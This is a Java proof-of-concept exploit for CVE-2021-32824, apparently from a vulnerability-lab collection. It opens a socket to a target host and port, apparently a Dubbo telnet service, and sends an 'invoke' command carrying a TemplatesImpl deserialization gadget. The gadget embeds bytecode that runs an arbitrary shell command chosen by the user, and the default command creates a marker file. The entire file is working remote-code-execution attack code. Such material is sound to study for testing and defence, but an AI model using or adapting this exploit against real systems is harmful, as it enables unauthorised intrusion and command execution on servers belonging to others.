package org.vulhub.poc;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.Socket;
import java.nio.charset.StandardCharsets;

public class CVE202132824 {
    public static void main(String[] args) throws Exception {
        String[] positional = PocUtils.positional(args);
        if (positional.length < 2 || positional.length > 3) {
            System.err.println("Usage: CVE-2021-32824 <host> <port> [command]");
            System.err.println("Example: CVE-2021-32824 127.0.0.1 20880 \"touch /tmp/success-telnet\"");
            System.exit(1);
        }

        String host = positional[0];
        int port = Integer.parseInt(positional[1]);
        String command = positional.length == 3 ? positional[2] : "touch /tmp/success-telnet";
        String bytecode = bytesToJsonArray(FastjsonGadget.makeTransletBytecode(command));
        String payload = "invoke org.vulhub.api.CalcService.echo({\"class\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\","
                + "\"_bytecodes\":[" + bytecode + "],\"_name\":\"Pwnr\",\"_transletIndex\":0,"
                + "\"_tfactory\":{\"class\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl\"}})";

        try (Socket socket = new Socket(host, port);
             BufferedReader reader = new BufferedReader(new InputStreamReader(socket.getInputStream(), StandardCharsets.UTF_8))) {
            socket.getOutputStream().write((payload + "\r\n").getBytes(StandardCharsets.UTF_8));
            socket.getOutputStream().flush();
            socket.shutdownOutput();

            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
        }

        System.out.println("Telnet payload sent to " + host + ":" + port);
    }

    private static String bytesToJsonArray(byte[] bytes) {
        StringBuilder builder = new StringBuilder("[");
        for (int i = 0; i < bytes.length; i++) {
            if (i > 0) {
                builder.append(',');
            }
            builder.append(bytes[i]);
        }
        return builder.append(']').toString();
    }
}
